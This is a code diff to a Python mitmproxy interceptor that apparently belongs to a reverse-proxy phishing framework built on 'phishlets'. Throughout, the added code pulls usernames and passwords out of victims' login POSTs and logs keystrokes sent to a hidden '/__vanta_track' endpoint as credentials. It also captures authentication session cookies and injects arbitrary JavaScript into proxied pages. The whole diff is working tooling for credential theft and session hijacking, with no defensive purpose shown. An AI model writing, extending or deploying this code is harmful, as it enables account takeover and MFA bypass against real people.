@@ -24,6 +24,7 @@ from core.edge.phishlets import PhishletConfig, PhishletLoader
 from core.edge.session import SessionManager
 from core.common import config
 from core.common.metrics import RATE_LIMITED, BLOCKED_IP
+from plugins.hook_system import trigger_hook, HookType, HookContext
 import time
 
 class VantaInterceptor:
@@ -37,7 +38,7 @@ class VantaInterceptor:
         self.deny_ips = set(config.get_list("DENY_IPS"))
         self._buckets = {}  # ip -> [timestamps]
 
-    def request(self, flow: http.HTTPFlow):
+    async def request(self, flow: http.HTTPFlow):
         """
         Handle incoming request:
         1. Identify session (cookie/path)
@@ -45,12 +46,50 @@ class VantaInterceptor:
         3. Strip indicators (referer)
         4. Path rewrites & blocklist
         """
-        host = flow.request.pretty_host
+        # Trigger Plugin Hook
+        context = HookContext(flow=flow, phishlet=self.phishlet)
+        await trigger_hook(HookType.HTTP_REQUEST_INTERCEPT, context)
+        if context.action == "block":
+            flow.response = http.Response.make(403, b"Blocked by Plugin", {})
+            return
+
+        # Session Identification
+        session_id = None
+        if "vanta_sid" in flow.request.cookies:
+            session_id = flow.request.cookies["vanta_sid"]
+        else:
+            # Create new session if landing
+            import uuid
+            session_id = str(uuid.uuid4())
+            # We'll set the cookie in response
+            if not hasattr(flow, "metadata"):
+                flow.metadata = {}
+            flow.metadata["v_new_session"] = session_id
+
+        # Ensure metadata exists
+        if not hasattr(flow, "metadata"):
+            flow.metadata = {}
+        flow.metadata["v_session_id"] = session_id
+        
+        # Ensure session exists in manager
         client_ip = "0.0.0.0"
         try:
-            client_ip = getattr(flow.client_conn, "address", ("0.0.0.0", 0))[0]  # type: ignore
+            client_ip = getattr(flow.client_conn, "address", ("0.0.0.0", 0))[0]
         except Exception:
             pass
+        
+        # Only create if not exists (or new)
+        if flow.metadata.get("v_new_session") or not self.session_manager.get_session(session_id):
+             ua = flow.request.headers.get("user-agent", "unknown")
+             self.session_manager.create_session(
+                 session_id=session_id,
+                 campaign_id="manual", # TODO: dynamic campaign ID
+                 phishlet_name=self.phishlet.name,
+                 ip=client_ip,
+                 ua=ua
+             )
+
+        host = flow.request.pretty_host
         # ACL
         if (self.allow_ips and client_ip not in self.allow_ips) or (client_ip in self.deny_ips):
             try:
@@ -73,9 +112,80 @@ class VantaInterceptor:
         else:
             bucket.append(now)
         
+        # Internal Telemetry Endpoint (Behavioral Data)
+        if flow.request.path == "/__vanta_track":
+            try:
+                if flow.request.method == "POST":
+                    data = {}
+                    if hasattr(flow.request, "multipart_form") and flow.request.multipart_form:
+                        try:
+                            # Handle MultiDictView safely
+                            for key, val in flow.request.multipart_form.items(multi=True):
+                                k_str = key.decode() if isinstance(key, bytes) else key
+                                v_str = val.decode() if isinstance(val, bytes) else val
+                                data[k_str] = v_str
+                        except Exception:
+                            pass
+                    else:
+                        # Try form-urlencoded
+                        try:
+                            if hasattr(flow.request, "urlencoded_form") and flow.request.urlencoded_form:
+                                for key, val in flow.request.urlencoded_form.items(multi=True):
+                                    k_str = key.decode() if isinstance(key, bytes) else key
+                                    v_str = val.decode() if isinstance(val, bytes) else val
+                                    data[k_str] = v_str
+                        except Exception:
+                            pass
+                    
+                    if data:
+                        self.logger.info(f"Captured Behavior: {data}")
+                        # Store in session if possible
+                        # trigger hook
+                        ctx = HookContext(flow=flow, phishlet=self.phishlet)
+                        ctx.data = data
+                        await trigger_hook(HookType.BEHAVIOR_CAPTURED, ctx)
+                        
+                        # If keystrokes look like credentials, try to capture them
+                        if 'f' in data and 'k' in data:
+                            field = data['f']
+                            val = data['k']
+                            # Very basic heuristic for now
+                            if 'pass' in field.lower() or 'email' in field.lower() or 'user' in field.lower():
+                                # Capture as credential
+                                self.session_manager.capture_credential(
+                                    session_id=session_id,
+                                    username=val if 'user' in field.lower() or 'email' in field.lower() else "unknown",
+                                    password=val if 'pass' in field.lower() else "unknown",
+                                    url=flow.request.pretty_url
+                                )
+                                self.logger.info(f"Keystroke Credential: {field}={val}")
+
+                if hasattr(http, "Response"):
+                    resp = http.Response.make(200, b"OK", {"Access-Control-Allow-Origin": "*", "Content-Type": "text/plain"})
+                    # Ensure session cookie is set if this was a new session
+                    if session_id and flow.metadata.get("v_new_session"):
+                        # Use header directly to avoid mitmproxy cookie parsing issues
+                        resp.headers["Set-Cookie"] = f"vanta_sid={session_id}; Path=/"
+                    flow.response = resp
+                return
+            except Exception as e:
+                import traceback
+                self.logger.error(f"Telemetry error: {e}\n{traceback.format_exc()}")
+                if hasattr(http, "Response"):
+                    flow.response = http.Response.make(500, b"Error", {})
+                return
+
         # TODO: Dynamic mapping based on loaded phishlet
         # For prototype, we assume the first proxy_host maps to target
-        target_map = {m.subdomain: m.target for m in self.phishlet.proxy_hosts}
+        target_map = {}
+        for m in self.phishlet.proxy_hosts:
+             # Support both legacy and new schema
+             key = m.phish_sub or m.subdomain
+             val = m.target
+             if not val and m.orig_sub and m.domain:
+                 val = f"{m.orig_sub}.{m.domain}"
+             if key and val:
+                 target_map[key] = val
         
         # Check if we are hitting a known phishing host
         # (Simplified matching logic for V5 MVP)
@@ -100,20 +210,25 @@ class VantaInterceptor:
         if not mapped:
             try:
                 first = next(iter(self.phishlet.proxy_hosts))
-                flow.request.host = first.target
-                try:
-                    flow.request.scheme = "https"
-                except Exception:
-                    pass
-                try:
-                    flow.request.port = 443
-                except Exception:
-                    pass
-                if not hasattr(flow, "metadata"):
-                    flow.metadata = {}
-                flow.metadata["v_ph_host"] = host
-                flow.metadata["v_tgt_host"] = first.target
-                self.logger.debug(f"Fallback host map: {host} -> {first.target}")
+                first_target = first.target
+                if not first_target and first.orig_sub and first.domain:
+                    first_target = f"{first.orig_sub}.{first.domain}"
+                
+                if first_target:
+                    flow.request.host = first_target
+                    try:
+                        flow.request.scheme = "https"
+                    except Exception:
+                        pass
+                    try:
+                        flow.request.port = 443
+                    except Exception:
+                        pass
+                    if not hasattr(flow, "metadata"):
+                        flow.metadata = {}
+                    flow.metadata["v_ph_host"] = host
+                    flow.metadata["v_tgt_host"] = first_target
+                    self.logger.debug(f"Fallback host map: {host} -> {first_target}")
             except Exception:
                 pass
         
@@ -194,6 +309,15 @@ class VantaInterceptor:
         3. Capture session tokens
         4. Header & Cookie rewrite rules
         """
+        # 0. Set Session Cookie if new
+        try:
+            new_sid = getattr(flow, "metadata", {}).get("v_new_session")
+            if new_sid:
+                flow.response.headers.add("Set-Cookie", f"vanta_sid={new_sid}; Path=/")
+                # Avoid accessing flow.response.cookies directly if it causes issues
+        except Exception:
+            pass
+
         # 1. Rewrite Location headers
         if "Location" in flow.response.headers:
             try:
@@ -305,26 +429,67 @@ class VantaInterceptor:
     def _scan_for_credentials(self, flow: http.HTTPFlow):
         """Analyze POST body for defined credential fields"""
         try:
+            session_id = getattr(flow, "metadata", {}).get("v_session_id")
+            if not session_id: return
+
             content = flow.request.get_text(strict=False) if hasattr(flow.request, "get_text") else flow.request.text
-            for rule in self.phishlet.credentials:
-                if rule.type == "post_param" and rule.name:
-                    if re.search(rf"(?:^|&){re.escape(rule.name)}=", content):
-                        self.logger.info(f"Detected credential param: {rule.name}")
-                        # TODO: capture and store via session_manager
-        except Exception:
-            pass
+            
+            # Helper to extract value
+            def extract(regex, text):
+                m = re.search(regex, text)
+                return m.group(1) if m else None
+
+            username = None
+            password = None
+            
+            for key, rule in self.phishlet.credentials.items():
+                if rule.type == "post_param" or rule.type == "post":
+                    # Regex for post param: key=value
+                    # Construct regex: (?:^|&)name=([^&]*)
+                    param_regex = rf"(?:^|&){re.escape(rule.key)}=([^&]*)"
+                    val = extract(param_regex, content)
+                    
+                    if val:
+                        import urllib.parse
+                        val = urllib.parse.unquote_plus(val)
+                        self.logger.info(f"Captured {key}: {val}")
+                        
+                        if key == "username" or key == "email":
+                            username = val
+                        elif key == "password":
+                            password = val
+
+            if username or password:
+                self.session_manager.capture_credential(
+                    session_id=session_id,
+                    username=username or "unknown",
+                    password=password or "unknown",
+                    url=flow.request.pretty_url
+                )
+        except Exception as e:
+            self.logger.error(f"Error scanning credentials: {e}")
 
     def _scan_for_tokens(self, flow: http.HTTPFlow):
         """Analyze Set-Cookie headers for session tokens"""
-        cookies = flow.response.cookies
-        for name, (value, attrs) in cookies.items():
-            # Check against phishlet auth_tokens rules
-            for rule in self.phishlet.auth_tokens:
-                if rule.name == name:
-                    # Capture!
-                    # Need session_id from flow context (to be implemented)
-                    # self.session_manager.capture_token(...)
-                    self.logger.info(f"Captured token candidate: {name}")
+        try:
+            session_id = getattr(flow, "metadata", {}).get("v_session_id")
+            if not session_id: return
+
+            cookies = flow.response.cookies
+            for name, (value, attrs) in cookies.items():
+                # Check against phishlet auth_tokens rules
+                for rule in self.phishlet.auth_tokens:
+                    # rule is AuthToken or Dict (Pydantic model or dict)
+                    r_keys = getattr(rule, "keys", [])
+                    if isinstance(rule, dict):
+                         r_keys = rule.get("keys", [])
+
+                    # If rule has keys list, check if name is in keys
+                    if name in r_keys:
+                        self.session_manager.capture_token(session_id, name, value)
+                        
+        except Exception as e:
+            self.logger.error(f"Error scanning tokens: {e}")
 
     def _inject_scripts(self, flow: http.HTTPFlow):
         if "text/html" in flow.response.headers.get("content-type", ""):
@@ -377,7 +542,8 @@ class VantaInterceptor:
                         flow.response.text = (flow.response.text or "") + f"<script>{js_bridge}</script>"
             except Exception:
                 pass
-            for injection in self.phishlet.injections:
+            # Legacy injections
+            for injection in getattr(self.phishlet, "injections", []) or []:
                 if injection.position == "body_end":
                     if "</body>" in flow.response.text:
                         flow.response.text = flow.response.text.replace(
@@ -386,6 +552,39 @@ class VantaInterceptor:
                         )
                     else:
                         flow.response.text = (flow.response.text or "") + f"<script>{injection.content}</script>"
+            
+            # New js_inject schema
+            for js in getattr(self.phishlet, "js_inject", []) or []:
+                # Check triggers
+                host = flow.request.pretty_host
+                path = flow.request.path
+                
+                domain_match = False
+                for d in js.trigger_domains:
+                    if d in host: 
+                        domain_match = True
+                        break
+                
+                if not domain_match: continue
+                
+                path_match = False
+                for p in js.trigger_paths:
+                    if p in path:
+                        path_match = True
+                        break
+                
+                if not path_match: continue
+                
+                # Inject
+                script_content = js.script
+                if "</body>" in flow.response.text:
+                    flow.response.text = flow.response.text.replace(
+                        "</body>",
+                        f"<script>{script_content}</script></body>"
+                    )
+                else:
+                    flow.response.text = (flow.response.text or "") + f"<script>{script_content}</script>"
+
             if getattr(self.phishlet, "form_actions", []):
                 parts = []
                 for r in self.phishlet.form_actions:
